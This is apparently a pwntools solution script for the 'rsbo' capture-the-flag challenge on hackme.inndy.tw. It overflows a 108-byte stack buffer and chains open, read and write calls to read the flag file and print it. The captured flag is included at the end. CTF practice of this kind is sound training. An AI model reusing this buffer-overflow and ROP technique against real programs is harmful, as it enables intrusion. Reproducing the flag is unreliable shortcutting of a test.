from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
path = '/home/zander/Desktop/ctf/rsbo-01c51ca9a7b9db3d69289c6dbb1cd758'

# b *0x080486A0 call    read_128_bytes
# buf 0xffffcf20
# __libc_start_main_ret 0xffffcf8c

elf = ELF(path)
open_plt_addr = elf.plt['open']
read_plt_addr = elf.plt['read']
write_plt_addr = elf.plt['write']
bss_addr = elf.bss()

offset = 0xffffcf8c - 0xffffcf20 # 108

# b *0x0804859B
flag_addr = 0x80487d0

start_addr = 0x08048490

#pop edi;pop ebp;ret
pop_pop_ret_addr = 0x0804879e

#pop esi;pop edi;pop ebp;ret
pop_pop_pop_ret_addr = 0x0804879d

#define O_RDONLY	0x0000
payload1 = fit({offset: p32(open_plt_addr) + p32(pop_pop_ret_addr) + p32(flag_addr) + p32(0) + p32(start_addr)}, filler='\x00')

payload2 = fit({offset: p32(read_plt_addr) + p32(start_addr) + p32(3) + p32(bss_addr) + p32(0x60)}, filler='\x00')

payload3 = fit({offset: p32(write_plt_addr) + p32(pop_pop_pop_ret_addr) + p32(1) + p32(bss_addr) + p32(0x60)}, filler='\x00')

# p = process(path)
p = remote('hackme.inndy.tw',7706)
p.send(payload1)
p.send(payload2)
p.send(payload3)
p.interactive()
p.close()

# FLAG{Shuffling 15 not a problem, just a piece of cake... XDDDDD...iJgZBwpBFh1TtpQR}